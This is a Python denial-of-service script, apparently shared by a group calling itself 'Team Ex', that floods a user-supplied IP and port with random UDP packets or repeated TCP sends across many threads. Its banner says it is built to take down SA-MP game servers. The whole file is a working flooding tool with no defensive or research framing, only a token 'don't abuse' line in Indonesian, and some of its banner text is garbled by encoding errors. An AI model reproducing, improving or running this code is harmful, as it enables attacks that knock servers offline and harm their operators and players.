#Remake By Queen&Vinz505
#Team Ex
import random
import socket
import threading
import os
import sys

print("--- AUTHOR BY : Queen&Vinz505 ")
print("--- TOOLS BY : Î£ð•CUTED ++---")
print("--- JANGAN ABUSE!!! ---")
print("===================================")
print("DDOS FOR SAMP, ULTRA - HOST, 20GTPS")
print("========== VERSION 1.0 ============")
ip = str(input(" IP Target:"))
port = int(input(" Port:"))
choice = str(input(" GASS ATTACK?(y/n):"))
times = int(input(" Package:"))
threads = int(input(" Threads:"))
def run():
  data = random._urandom(1024)
  i = random.choice(("[]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
      print(i +" VINZ505 ATTACK TO SERVER!!!")
    except:
      print("Server down konto!!")

def run2():
  data = random._urandom(999)
  i = random.choice(("[]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
      print(i +" VINZ505 ATTACK TO SERVER!!!")
    except:
      s.close()
      print("[*] Server haram !!")

for y in range(threads):
  if choice == 'y':
    th = threading.Thread(target = run)
    th.start()
  else:
    th = threading.Thread(target = run2)
    th.start()   â€Š